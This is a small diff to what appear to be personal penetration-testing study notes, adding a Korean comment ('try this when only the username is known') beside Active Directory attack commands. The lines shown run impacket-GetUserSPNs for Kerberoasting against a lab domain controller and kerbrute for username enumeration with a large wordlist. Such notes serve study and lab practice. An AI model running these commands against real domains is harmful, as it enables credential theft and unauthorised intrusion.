@@ -88,6 +88,7 @@ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 
 ```bash
 impacket-GetUsersSPNs -request -dc-ip <ip> <domain>/<user> -no-pass
+# username만 아는 상태로 시도해볼 것.
 
 ./kerbrute_linux_amd64 userenum --dc 192.168.133.40 -d haero /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 ```
